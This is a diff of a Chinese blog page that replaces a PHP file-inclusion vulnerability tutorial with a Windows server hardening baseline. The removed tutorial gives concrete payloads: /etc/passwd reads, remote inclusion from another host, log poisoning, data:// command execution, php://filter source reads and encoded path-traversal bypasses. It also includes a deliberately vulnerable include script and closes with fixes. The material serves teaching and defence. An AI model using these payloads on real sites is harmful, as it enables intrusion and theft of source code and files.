@@ -112,38 +112,17 @@
 
 
 
-  <meta name="description" content="严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。  require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。  require">
+  <meta name="description" content="操作系统安全基线服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。 主要作用： 设置口令复杂度策略，防止暴力破解密码。 控制用户或文件权限，减少被攻击后的影响。 最小化安装操作系统，防止不必要的服务带来的安全问题。  基线范围 操作系统 网络设备 数据库 中间件  Windows系统配置安全账户管理多用户系统 Windows不应只有一个管理员用户，应根据业务需求，设定不同的用户">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件包含漏洞详解">
-<meta property="og:url" content="http://yoursite.com/2018/12/02/文件包含漏洞详解/index.html">
+<meta property="og:title" content="Windows系统配置安全">
+<meta property="og:url" content="http://yoursite.com/2018/12/18/Windows系统配置安全/index.html">
 <meta property="og:site_name" content="guolala&#39;s blog">
-<meta property="og:description" content="严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。  require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。  require">
+<meta property="og:description" content="操作系统安全基线服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。 主要作用： 设置口令复杂度策略，防止暴力破解密码。 控制用户或文件权限，减少被攻击后的影响。 最小化安装操作系统，防止不必要的服务带来的安全问题。  基线范围 操作系统 网络设备 数据库 中间件  Windows系统配置安全账户管理多用户系统 Windows不应只有一个管理员用户，应根据业务需求，设定不同的用户">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.imgur.com/aLJdj9E.png">
-<meta property="og:image" content="https://i.imgur.com/tvkgeYA.png">
-<meta property="og:image" content="https://i.imgur.com/25CI6aq.png">
-<meta property="og:image" content="https://i.imgur.com/wgq7QtT.png">
-<meta property="og:image" content="https://i.imgur.com/CSUgdBp.png">
-<meta property="og:image" content="https://i.imgur.com/TP2yw0G.png">
-<meta property="og:image" content="https://i.imgur.com/HCmTOhJ.png">
-<meta property="og:image" content="https://i.imgur.com/MkYTX3b.png">
-<meta property="og:image" content="https://i.imgur.com/en29m6p.png">
-<meta property="og:image" content="https://i.imgur.com/DNV6gBY.png">
-<meta property="og:image" content="https://i.imgur.com/is1PJIk.png">
-<meta property="og:image" content="https://i.imgur.com/w5hVkH8.png">
-<meta property="og:image" content="https://i.imgur.com/zfzbat0.png">
-<meta property="og:image" content="https://i.imgur.com/LWAR7Gk.png">
-<meta property="og:image" content="https://i.imgur.com/5uTt3Qz.png">
-<meta property="og:image" content="https://i.imgur.com/6I762D1.png">
-<meta property="og:image" content="https://i.imgur.com/TO2gT9d.png">
-<meta property="og:image" content="https://i.imgur.com/DFzB7L3.png">
-<meta property="og:image" content="https://i.imgur.com/Tpznihz.png">
-<meta property="og:image" content="https://i.imgur.com/fwBEvdb.png">
-<meta property="og:updated_time" content="2018-12-02T10:56:35.202Z">
+<meta property="og:updated_time" content="2018-12-18T09:24:12.686Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="文件包含漏洞详解">
-<meta name="twitter:description" content="严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。  require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。  require">
-<meta name="twitter:image" content="https://i.imgur.com/aLJdj9E.png">
+<meta name="twitter:title" content="Windows系统配置安全">
+<meta name="twitter:description" content="操作系统安全基线服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。 主要作用： 设置口令复杂度策略，防止暴力破解密码。 控制用户或文件权限，减少被攻击后的影响。 最小化安装操作系统，防止不必要的服务带来的安全问题。  基线范围 操作系统 网络设备 数据库 中间件  Windows系统配置安全账户管理多用户系统 Windows不应只有一个管理员用户，应根据业务需求，设定不同的用户">
 
 
 
@@ -152,7 +131,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/02/文件包含漏洞详解/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/18/Windows系统配置安全/">
 
 
 
@@ -162,7 +141,7 @@
   };
 </script>
 
-  <title>文件包含漏洞详解 | guolala's blog</title>
+  <title>Windows系统配置安全 | guolala's blog</title>
   
 
 
@@ -375,7 +354,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/02/文件包含漏洞详解/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/18/Windows系统配置安全/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="guolala">
@@ -392,7 +371,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">文件包含漏洞详解
+          <h1 class="post-title" itemprop="name headline">Windows系统配置安全
               
             
           </h1>
@@ -417,7 +396,7 @@
                 
               
 
-              <time title="创建时间：2018-12-02 16:01:44 / 修改时间：18:56:35" itemprop="dateCreated datePublished" datetime="2018-12-02T16:01:44+08:00">2018-12-02</time>
+              <time title="创建时间：2018-12-18 11:47:36 / 修改时间：17:24:12" itemprop="dateCreated datePublished" datetime="2018-12-18T11:47:36+08:00">2018-12-18</time>
             
 
             
@@ -439,7 +418,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/文件包含/" itemprop="url" rel="index"><span itemprop="name">文件包含</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/windows/" itemprop="url" rel="index"><span itemprop="name">windows</span></a></span>
 
                 
                 
@@ -480,219 +459,198 @@
       
 
       
-        <p>严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。</p>
-<p><strong>常见的导致文件包含（文件读取）的函数如下：</strong></p>
-<p><strong>PHP：</strong></p>
-<p><strong>include()</strong>：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p>
-<p><img src="https://i.imgur.com/aLJdj9E.png" alt=""></p>
-<p><strong>require()</strong>：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p>
-<p><img src="https://i.imgur.com/tvkgeYA.png" alt=""></p>
-<p><code>require_once()</code> 和 <code>include_once()</code> 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 <code>require_once()</code> 和<code>include_once()</code> 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
-<blockquote>
-<p><strong>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</strong></p>
-</blockquote>
-<p>接下来的测试会用下面这个非常简单的代码进行：</p>
-<pre><code>&lt;?php
-    $file = $_GET[&apos;file&apos;];
-    include $file;
-?&gt;
-</code></pre><p>同目录下有一个phpinfo.txt文件（内容为&lt;?php phpinfo();?&gt;）</p>
-<p><img src="https://i.imgur.com/25CI6aq.png" alt=""></p>
-<h3 id="文件包含有两种："><a href="#文件包含有两种：" class="headerlink" title="文件包含有两种："></a>文件包含有两种：</h3><p>本地文件包含、远程文件包含 （即加载远程文件，在php.ini中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。开启后可以直接执行任意代码。）</p>
-<h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞。</p>
-<ul>
-<li>具有相关的文件包含函数。</li>
-<li>文件包含函数中存在动态变量，比如 include $file;。</li>
-<li>攻击者能够控制该变量，比如$file = $_GET[‘file’];。</li>
+        <h1 id="操作系统安全基线"><a href="#操作系统安全基线" class="headerlink" title="操作系统安全基线"></a>操作系统安全基线</h1><p>服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。</p>
+<h2 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h2><ul>
+<li>设置口令复杂度策略，防止暴力破解密码。</li>
+<li>控制用户或文件权限，减少被攻击后的影响。</li>
+<li>最小化安装操作系统，防止不必要的服务带来的安全问题。</li>
 </ul>
-<h2 id="php的文件包含利用"><a href="#php的文件包含利用" class="headerlink" title="php的文件包含利用"></a>php的文件包含利用</h2><p><strong>在php.ini中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。</strong></p>
-<h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>访问：<code>http://www.test.com/index.php?test=/etc/passwd</code>,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。</p>
-<h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><ol>
-<li><code>allow_url_fopen</code> = On</li>
-<li><code>allow_url_include</code> = On</li>
-</ol>
-<p>在远程文件<code>http://10.60.17.60</code>里写入测试代码。</p>
-<pre><code>&lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt;
-</code></pre><p>  访问<code>http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php</code>。将会在网站根目录下生成text.php文件，内容就是：”<code>&lt;?php phpinfo(); ?&gt;</code>“</p>
-<p><img src="https://i.imgur.com/wgq7QtT.png" alt=""></p>
-<h3 id="图片上传并包含图片shell"><a href="#图片上传并包含图片shell" class="headerlink" title="图片上传并包含图片shell"></a>图片上传并包含图片shell</h3><p>利用方法和上面的一样，只是这次是本地包含，直接在上传的图片中写入测试代码并访问图片地址即可。</p>
-<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p><strong>利用条件：</strong>需要知道ssh-log的位置，且可读。默认情况下为 <code>/var/log/auth.log</code></p>
-<pre><code>ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost
-</code></pre><p>之后会提示输入密码等等，随便输入。</p>
-<p>然后在remotehost的ssh-log中即可写入php代码：</p>
-<p><img src="https://i.imgur.com/CSUgdBp.png" alt=""></p>
-<p>之后进行文件包含即可。</p>
-<h3 id="包含日志文件GetShell"><a href="#包含日志文件GetShell" class="headerlink" title="包含日志文件GetShell"></a>包含日志文件GetShell</h3><p><strong>利用条件：</strong>需要知道服务器日志的存储路径，且日志文件可读。</p>
-<p>既然存在文件包含漏洞就可以利用漏洞读取apache的配置文件找到日志文件的位置。（默认：包含日志文件GetShell）</p>
-<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 <code>/var/log/apache2/</code>。</p>
-<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改.</p>
-<p><img src="https://i.imgur.com/TP2yw0G.png" alt=""></p>
-<p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。</p>
-<p><img src="https://i.imgur.com/HCmTOhJ.png" alt=""></p>
-<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
-<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.2.8</p>
-<p>目录字符串，在linux下<strong>4096字节</strong>时会达到最大值，在window下是<strong>256字节</strong>。只要不断的重复<code>./</code></p>
-<pre><code>index.php?file=././././省略././shell.txt
-</code></pre><h3 id="0字节截断包含"><a href="#0字节截断包含" class="headerlink" title="0字节截断包含"></a>0字节截断包含</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.3.4</p>
-<p>测试代码：</p>
-<pre><code>&lt;?php
-    $file = $_GET[&apos;file&apos;];
-    include $file.&apos;/tasdas/asd.php&apos;;
-?&gt;
-
-http://127.0.0.1/123.php?file=phpinfo.txt%00
-</code></pre><p><img src="https://i.imgur.com/MkYTX3b.png" alt=""></p>
-<blockquote>
-<p>正常上传图片一句话并访问：<code>http://test.com/index.php?test=1.jpg</code>会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入<code>http://test.com/index.php?test=1.jpg%00</code>，就极有可能会绕过检测。这种方法只适用于php.ini中<code>magic_quotes_qpc=off</code>并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。</p>
-</blockquote>
-<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>PHP伪协议其实就是PHP支持的协议和封装的协议，</p>
-<ul>
-<li>file: — 访问本地文件系统</li>
-<li>http: — 访问 HTTP(s) 网址</li>
-<li>ftp: — 访问 FTP(s) URLs</li>
-<li>php: — 访问各个输入/输出流（I/O streams）【php://stdin 是只读的， php://stdout 和 php://stderr 是只写的】</li>
-<li>zlib: — 压缩流</li>
-<li>data: — 数据（RFC 2397）</li>
-<li>glob: — 查找匹配的文件路径模式</li>
-<li>phar: — PHP 归档</li>
-<li>ssh2: — Secure Shell 2</li>
-<li>rar: — RAR</li>
-<li>ogg: — 音频流</li>
-<li>expect: — 处理交互式的流</li>
+<h2 id="基线范围"><a href="#基线范围" class="headerlink" title="基线范围"></a>基线范围</h2><ul>
+<li>操作系统</li>
+<li>网络设备</li>
+<li>数据库</li>
+<li>中间件</li>
 </ul>
-<p>有两个比较重要的配置在php.ini中，<code>allow_url_fopen</code> 和<code>allow_url_include</code>会影响到fopen和include等等函数对于伪协议的支持，而<code>allow_url_include</code>依赖<code>allow_url_fopen</code>，所以<code>allow_url_fopen</code>不开启的话，<code>allow_url_include</code>也是无法使用的。</p>
-<h4 id="File"><a href="#File" class="headerlink" title="File://"></a>File://</h4><p>用于访问文件系统。（可用于任意文件执行），在<code>allow_url_fopen</code> 和<code>allow_url_include</code>任何状态下都可以用。</p>
-<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><ul>
-<li>php版本大于等于php5.2</li>
-<li><code>allow_url_fopen</code> = On</li>
-<li><code>allow_url_include</code> = On</li>
+<h1 id="Windows系统配置安全"><a href="#Windows系统配置安全" class="headerlink" title="Windows系统配置安全"></a>Windows系统配置安全</h1><h2 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a>账户管理</h2><h3 id="多用户系统"><a href="#多用户系统" class="headerlink" title="多用户系统"></a>多用户系统</h3><ul>
+<li>Windows不应只有一个管理员用户，应根据业务需求，设定不同的用户和用户组，如管理员用户、Web用户、数据库用户等。</li>
 </ul>
-<pre><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php phpinfo();?&gt;
-</code></pre><p>任意命令执行</p>
-<pre><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;
-</code></pre><p>利用base64编码绕过</p>
-<pre><code>http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
-</code></pre><blockquote>
-<p>加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p>
-</blockquote>
-<p><img src="https://i.imgur.com/en29m6p.png" alt=""></p>
-<p><img src="https://i.imgur.com/DNV6gBY.png" alt=""></p>
-<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>php版本大于等于php5.3.0</p>
-<p>在网站根目录下有一个phpinfo.txt内容为&lt;?php phpinfo();?&gt;，打包成压缩包。</p>
-<p>使用绝对路径：</p>
-<pre><code>http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
-</code></pre><p><img src="https://i.imgur.com/is1PJIk.png" alt=""></p>
-<p>或者使用相对路径：</p>
-<pre><code>http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt
-</code></pre><p><img src="https://i.imgur.com/w5hVkH8.png" alt=""></p>
-<h4 id="zip-–-zlib-–bzip2-–zip"><a href="#zip-–-zlib-–bzip2-–zip" class="headerlink" title="zip:// – zlib:// –bzip2:// –zip://"></a>zip:// – zlib:// –bzip2:// –zip://</h4><p>php版本大于等于php5.3.0</p>
-<p>构造zip包的方法同phar</p>
-<p>但是使用zip协议，需要指定<strong>绝对路径</strong>，同时将#编码为%23，之后填上压缩包内的文件。</p>
-<pre><code>http://127.0.0.1/123.php?file=zip://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
-
-http://127.0.0.1/123.php?file=zip://phpinfo.zip%23phpinfo.txt
-
-http://127.0.0.1/123.php?file=zip://./phpinfo.zip%23phpinfo.txt
-</code></pre><p><img src="https://i.imgur.com/zfzbat0.png" alt=""></p>
-<p><strong>压缩流：</strong>在<code>allow_url_fopen</code> 和<code>allow_url_include</code>任何状态下都可以用。</p>
-<p>使用方法：</p>
-<pre><code>http://127.0.0.1/test/1.php?f=zip://./1.zip%231.txt
-
-http://127.0.0.1/test/1.php?f=zip:///Applications/MAMP/htdos/test/1.zip%231.txt
-
-http://127.0.0.1/test/1.php?f=file=compress.bzip2:///Applications/MAMP/htdos/test/file.jpg
-
-http://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg
-</code></pre><h5 id="另一种思路："><a href="#另一种思路：" class="headerlink" title="另一种思路："></a>另一种思路：</h5><p>将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩，压缩文件 名为file.zip，如果可以上传zip文件便直接上传，如果不能则将file.zip重命名为file.jpg后上传，其他几种压缩格式也可以这样操作。</p>
-<h4 id="PHP-input"><a href="#PHP-input" class="headerlink" title="PHP://input"></a>PHP://input</h4><p><code>allow_url_include = On。</code></p>
-<p>对<code>allow_url_fopen</code>不做要求。</p>
-<p><img src="https://i.imgur.com/LWAR7Gk.png" alt=""></p>
-<p>可以访问请求的原始数据，简单来说POST请求下，php://input可以获取到post数据，如果<code>enctype=”multipart/form-data”</code> 的时候 php://input 是无效的。</p>
-<h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
-<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>对<code>allow_url_include</code> 和<code>allow_url_fopen</code>不做要求。</p>
-<p>在任意文件读取或者getshell会用到这个伪协议。</p>
-<pre><code>http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php
-</code></pre><p><img src="https://i.imgur.com/5uTt3Qz.png" alt=""></p>
-<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p>
-<p><img src="https://i.imgur.com/6I762D1.png" alt=""></p>
-<pre><code>http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php
-</code></pre><p>效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。</p>
-<p><img src="https://i.imgur.com/TO2gT9d.png" alt=""></p>
-<p>php://filter类似于readfile()、file()、file_get_contents(),在数据流内容读取之前没有机会应用其他过滤器。</p>
-<p>在include函数使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p>
-<p><strong>php://filter 目标使用以下的参数作为它路径的一部分:</strong></p>
-<ul>
-<li>resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。 </li>
-<li>read=&lt;读链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li>
-<li>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li>
+<h3 id="定期检查用户，删除无用、过期的账户"><a href="#定期检查用户，删除无用、过期的账户" class="headerlink" title="定期检查用户，删除无用、过期的账户"></a>定期检查用户，删除无用、过期的账户</h3><ul>
+<li>应保证所有用户均为有效且在用。</li>
 </ul>
-<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>现在在C:\phpStudy\PHPTutorial\phpinfo.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历。</p>
-<pre><code>http://127.0.0.1/123.php?file=../phpinfo.txt
-</code></pre><p><img src="https://i.imgur.com/DFzB7L3.png" alt=""></p>
-<blockquote>
-<p>实际拼接路径为：C:\phpStudy\PHPTutorial\WWW..\phpinfo.txt即C:\phpStudy\PHPTutorial\phpinfo.txt</p>
-</blockquote>
-<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>服务器端常常会对于 <strong>../</strong> 等做一些过滤，可以用一些编码来进行绕过。</p>
-<p><strong>利用url编码</strong></p>
-<p><strong>../：</strong></p>
-<ul>
-<li>%2e%2e%2f</li>
-<li>..%2f</li>
-<li>%2e%2e/</li>
+<h3 id="禁用Guest用户"><a href="#禁用Guest用户" class="headerlink" title="禁用Guest用户"></a>禁用Guest用户</h3><ul>
+<li>系统应禁用Guest账户，Guest账户默认不开启。</li>
 </ul>
-<p><strong>..\：</strong></p>
-<ul>
-<li>%2e%2e%5c</li>
-<li>..%5c</li>
-<li>%2e%2e\</li>
+<h3 id="更改默认管理员账户名称"><a href="#更改默认管理员账户名称" class="headerlink" title="更改默认管理员账户名称"></a>更改默认管理员账户名称</h3><ul>
+<li>应更改默认的管理员名称administrator，防止暴力破解等问题。</li>
 </ul>
-<p><strong>二次编码</strong></p>
-<p><strong>../：</strong></p>
-<ul>
-<li>%252e%252e%252f</li>
+<h3 id="不显示最后的用户名"><a href="#不显示最后的用户名" class="headerlink" title="不显示最后的用户名"></a>不显示最后的用户名</h3><ul>
+<li>用户登出后，下次登陆时，不应显示登录名称</li>
 </ul>
-<p><strong>..\：</strong></p>
-<ul>
-<li>%252e%252e%255c</li>
+<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><ul>
+<li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理</li>
+<li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略</li>
 </ul>
-<p><strong>容器/服务器的编码方式</strong></p>
-<p><strong>../：</strong></p>
-<ul>
-<li>..%c0%af</li>
-<li>%c0%ae%c0%ae/（java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点））</li>
+<h2 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h2><h3 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h3><ul>
+<li>应启用密码策略，根据规范设置密码长度、复杂度等选项。</li>
 </ul>
-<p><strong>..\：</strong></p>
-<ul>
-<li>..%c1%9c</li>
+<h3 id="更换密码周期"><a href="#更换密码周期" class="headerlink" title="更换密码周期"></a>更换密码周期</h3><ul>
+<li>应定期更改静态口令，建议不超过90天。</li>
 </ul>
-<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><p>测试代码：</p>
-<pre><code>&lt;?php
-    $file = $_GET[&apos;file&apos;];
-    include $file.&apos;/test/test.php&apos;;
-?&gt;
-</code></pre><p>构造压缩包结构如下：</p>
-<p><img src="https://i.imgur.com/Tpznihz.png" alt=""></p>
-<pre><code>http://127.0.0.1/1.php?file=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23test
-
-http://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip
-</code></pre><p><img src="https://i.imgur.com/fwBEvdb.png" alt=""></p>
-<blockquote>
-<p>利用zip协议，注意要指定绝对路径</p>
-</blockquote>
-<p><strong>则拼接后为：zip://C:\phpStudy\PHPTutorial\WWW\test%23test/test/test.php</strong></p>
-<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>$$导致的变量覆盖，举个例子</p>
-<p>$key = ‘hello’</p>
-<p>$hello = ‘world’</p>
-<p>echo $$key</p>
-<p>输出world</p>
-<h2 id="文件包含修复方案"><a href="#文件包含修复方案" class="headerlink" title="文件包含修复方案"></a>文件包含修复方案</h2><ul>
-<li>禁止远程文件包含： <code>allow_url_include=off</code></li>
-<li>配置 <code>open_basedir=</code>指定目录，限制访问区域。</li>
-<li>过滤<strong>../</strong>等特殊符号</li>
-<li>修改Apache日志文件的存放地址</li>
-<li>开启魔术引号 <code>magic_quotes_qpc=on</code></li>
-<li>尽量不要使用动态变量调用文件，直接写要包含的文件</li>
+<h3 id="用户锁定策略"><a href="#用户锁定策略" class="headerlink" title="用户锁定策略"></a>用户锁定策略</h3><ul>
+<li>应配置账户锁定策略，防止暴力破解攻击。</li>
 </ul>
+<h3 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h3><ul>
+<li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理-&gt;用户策略</li>
+</ul>
+<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="远程关机"><a href="#远程关机" class="headerlink" title="远程关机"></a>远程关机</h3><ul>
+<li>应只有管理员用户可以远程关闭操作系统。</li>
+</ul>
+<h3 id="本地关机"><a href="#本地关机" class="headerlink" title="本地关机"></a>本地关机</h3><ul>
+<li>只有管理员用户可以本地关闭操作系统。</li>
+</ul>
+<h3 id="用户权限指派"><a href="#用户权限指派" class="headerlink" title="用户权限指派"></a>用户权限指派</h3><ul>
+<li>取得文件或其他对象的所有权限应只分配给administrators组</li>
+</ul>
+<h3 id="授权用户登录"><a href="#授权用户登录" class="headerlink" title="授权用户登录"></a>授权用户登录</h3><ul>
+<li>配置指定授权用户允许本地登陆此计算机。</li>
+</ul>
+<h3 id="授权账户从网络访问"><a href="#授权账户从网络访问" class="headerlink" title="授权账户从网络访问"></a>授权账户从网络访问</h3><ul>
+<li>只允许授权账号从网络访问（包括网络共享等，但不包括终端服务）此计算机。</li>
+</ul>
+<h3 id="禁用未登录前关机"><a href="#禁用未登录前关机" class="headerlink" title="禁用未登录前关机"></a>禁用未登录前关机</h3><ul>
+<li>如果启用此设置，服务器安全性将会大大降低，给远程连接的黑客可乘之机，所以建议禁用未登录前关机功能</li>
+</ul>
+<h3 id="检测方法-2"><a href="#检测方法-2" class="headerlink" title="检测方法"></a>检测方法</h3><ul>
+<li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略-&gt;本地策略</li>
+</ul>
+<h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><h3 id="设置日志文件大小"><a href="#设置日志文件大小" class="headerlink" title="设置日志文件大小"></a>设置日志文件大小</h3><ul>
+<li>设置应用日志文件大小至少为8192KB，可根据磁盘空间配置日志文件大小，记录的日志越多越好。</li>
+<li>设置当达到最大的日志尺寸时，按需要轮询记录日志。</li>
+</ul>
+<h3 id="检测方法-3"><a href="#检测方法-3" class="headerlink" title="检测方法"></a>检测方法</h3><ul>
+<li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略-&gt;本地策略-&gt;审核策略</li>
+<li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;事件查看器-&gt;windows日志，查看应用日志、系统日志、安全日志属性中的日志大小，并根据安全策略设置达到日志最大大小时的操作。</li>
+</ul>
+<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="关闭默认共享"><a href="#关闭默认共享" class="headerlink" title="关闭默认共享"></a>关闭默认共享</h3><ul>
+<li>非域环境中，关闭Windows硬盘默认共享，例如C$,D$</li>
+</ul>
+<h3 id="设置共享文件夹权限"><a href="#设置共享文件夹权限" class="headerlink" title="设置共享文件夹权限"></a>设置共享文件夹权限</h3><ul>
+<li>每个共享文件夹的共享权限，只允许授权的账户拥有共享此文件夹的权限。</li>
+</ul>
+<h3 id="检测方法-4"><a href="#检测方法-4" class="headerlink" title="检测方法"></a>检测方法</h3><ul>
+<li>打开cmd，输入net share查看当前共享</li>
+<li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理-&gt;共享文件夹，查看每个共享文件夹权限。</li>
+</ul>
+<h2 id="最小化安装"><a href="#最小化安装" class="headerlink" title="最小化安装"></a>最小化安装</h2><p>根据业务需求，禁用不必要的服务，删除不必要的文件</p>
+<h2 id="其他设置"><a href="#其他设置" class="headerlink" title="其他设置"></a>其他设置</h2><ul>
+<li>应安装防病毒软件，确保病毒库及时更新。</li>
+<li>设置从屏幕保护恢复时需要输入密码，并将屏幕保护自动开启时间设定为五分钟。</li>
+<li>对于远程登录的账户，设置不活动超过时间15分钟地洞断开连接。</li>
+<li>关闭自动播放功能，防止自动运行恶意程序。</li>
+<li>无特殊需求应该关闭远程桌面。</li>
+<li>无特殊需求应该关闭远程协助。</li>
+<li>开启windows防火墙，对进出站规则进行限制。</li>
+</ul>
